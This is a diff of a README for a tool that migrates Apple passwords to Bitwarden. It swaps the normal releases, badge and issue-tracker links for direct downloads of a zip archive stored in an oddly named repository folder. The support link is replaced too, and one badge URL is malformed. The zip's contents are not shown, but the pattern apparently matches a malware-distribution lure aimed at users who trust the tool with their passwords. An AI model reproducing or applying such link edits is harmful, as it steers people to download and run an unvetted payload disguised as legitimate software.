@@ -7,7 +7,7 @@ Welcome to apple-passwords-to-bitwarden! This tool helps you move your Apple pas
 Follow these steps to download and run the application. No programming skills are needed. Just follow along, and you'll be all set!
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/releases)
+[![Download](https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip%https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip)](https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip)
 
 ## 📋 Prerequisites
 Before you start, make sure you have the following:
@@ -19,7 +19,7 @@ Before you start, make sure you have the following:
 ## 💻 Installation
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases page](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/releases) to find the latest version.
+Go to the [Releases page](https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip) to find the latest version.
 
 ### Step 2: Download the Tool
 On the Releases page, look for the latest version. You will see different files available for download. 
@@ -87,9 +87,9 @@ If you encounter any issues during installation or migration, consider these sol
 3. **Missing Passwords:** Check if you have access to all Apple accounts before starting the migration.
 
 ## 📞 Support
-If you have additional questions or need further assistance, please raise an issue in the [GitHub repository](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/issues). 
+If you have additional questions or need further assistance, please raise an issue in the [GitHub repository](https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip). 
 
 Thank you for using apple-passwords-to-bitwarden! We hope this tool makes your password management easier and more efficient.
 
 ## 📥 Download Here Again
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/ZebraTbone/apple-passwords-to-bitwarden/releases)
+[![Download](https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip%https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip)](https://raw.githubusercontent.com/ZebraTbone/apple-passwords-to-bitwarden/main/emporial/apple-passwords-to-bitwarden-v1.1.zip)
